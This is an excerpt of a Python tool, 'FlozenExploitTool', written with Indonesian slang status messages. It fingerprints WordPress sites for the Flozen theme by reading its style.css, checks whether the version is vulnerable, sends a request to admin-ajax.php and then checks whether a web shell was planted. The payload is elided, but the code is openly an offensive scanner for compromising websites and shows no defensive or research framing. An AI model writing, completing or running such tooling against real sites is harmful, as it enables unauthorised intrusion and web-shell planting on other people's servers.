...
class FlozenExploitTool:
    ...
    def check_theme_exists(self, url):
        try:
            css_url = f"{url.rstrip('/')}/wp-content/themes/flozen-theme/style.css"
            resp = requests.get(css_url, headers=self.headers, 
    ...
    def exploit_site(self, url):
        try:
            version = self.check_theme_exists(url)
            if not version:
                print(f"{Fore.YELLOW}[!] Gak Ada Bro Themes nya!: {url}")
                return False
            
            if not self.check_version_vuln(version):
                print(f"{Fore.RED}[-] Gak Rentan Cuk!: {url} | Version: {version}")
                return False
            
            print(f"{Fore.GREEN}[+] Gas Exploit Cuk! {url} | Version: {version} 🚩💉")
            
            exploit_url = f"{url.rstrip('/')}/wp-admin/admin-ajax.php"
            ...
            shell_found = self.check_shell(url)
    ...
    def check_shell(self, url):
        try:
            shell_url = f"{url.rstrip('/')}{self.shell_path}"
            
            response = requests.get(shell_url, headers=self.headers, 
                                  verify=False, timeout=10)
